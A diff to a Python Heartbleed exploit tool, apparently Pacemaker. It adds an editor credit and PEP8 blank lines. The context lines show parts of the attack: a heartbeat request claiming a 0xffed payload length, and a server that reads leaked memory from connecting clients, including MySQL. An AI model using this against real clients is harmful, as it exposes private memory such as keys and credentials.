@@ -3,6 +3,8 @@
 # Author: Peter Wu <peter@lekensteyn.nl>
 # Licensed under the MIT license <http://opensource.org/licenses/MIT>.
 
+# Edited by Suixo <suixo@securem.eu>
+
 # Python 2.6 compatibility
 from __future__ import unicode_literals
 
@@ -27,6 +29,7 @@ from argparse import ArgumentParser, ArgumentTypeError
 # The returned heartbeat fragment has length 3 + payload length + 16 (type,
 # payload length, payload, padding).
 MAX_PLAIN_LENGTH = 0x4000
+
 
 def payload_len(string):
     # Minimum OpenSSL buffer fill size for the fragment (excl. record "header")
@@ -74,6 +77,7 @@ parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
         help='Requested payload length including 19 bytes heartbeat type, ' +
             'payload length and padding (default %(default)#x bytes)')
 
+
 def make_hello(sslver, cipher):
     # Record
     data = '16 ' + sslver
@@ -96,6 +100,7 @@ def make_hello(sslver, cipher):
     data += ' 01'    # mode
     return bytearray.fromhex(data.replace('\n', ''))
 
+
 def make_heartbeat(sslver, payload_len=0xffed):
     data = '18 ' + sslver
     data += ' 00 03'    # Length
@@ -107,6 +112,7 @@ def make_heartbeat(sslver, payload_len=0xffed):
     # records (0x4000 * 4 - 3 - 16 = 0xffed).
     data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
     return bytearray.fromhex(data.replace('\n', ''))
+
 
 def hexdump(data):
     allzeroes = b'\0' * 16
@@ -125,11 +131,14 @@ def hexdump(data):
             ' '.join('{0:02x}'.format(c) for c in line),
             ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))
 
+
 class Failure(Exception):
     pass
 
+
 class RecordParser(object):
     record_s = struct.Struct(b'!BHH')
+
     def __init__(self):
         self.buffer = bytearray()
         self.buffer_len = 0
@@ -169,6 +178,7 @@ class RecordParser(object):
 
         return record_type, sslver, bytes(fragment)
 
+
 def read_record(sock, timeout, partial=False):
     rparser = RecordParser()
     end_time = time.time() + timeout
@@ -192,6 +202,7 @@ def read_record(sock, timeout, partial=False):
         timeout = end_time - time.time()
 
     return rparser.get_record(partial=partial), error
+
 
 def read_hb_response(sock, timeout):
     end_time = time.time() + timeout
@@ -248,6 +259,7 @@ def read_hb_response(sock, timeout):
         print('Did not receive heartbeat response! ' + str(read_error))
 
     return memory
+
 
 class RequestHandler(socketserver.BaseRequestHandler):
     def handle(self):
@@ -342,7 +354,6 @@ class RequestHandler(socketserver.BaseRequestHandler):
         if not cond:
             raise Failure(what)
 
-
     def prepare_mysql(self, sock):
         # This was taken from a MariaDB client. For reference, see
         # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake
@@ -419,6 +430,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
         self.expect(len(data) == s.size, msg)
         return s.unpack(data)
 
+
 class PacemakerServer(socketserver.TCPServer):
     def __init__(self, args):
         server_address = (args.listen, args.port)
@@ -435,6 +447,7 @@ class PacemakerServer(socketserver.TCPServer):
 
     def kill(self):
         self.stopped = True
+
 
 def serve(args):
     print('Listening on {0}:{1} for {2} clients'
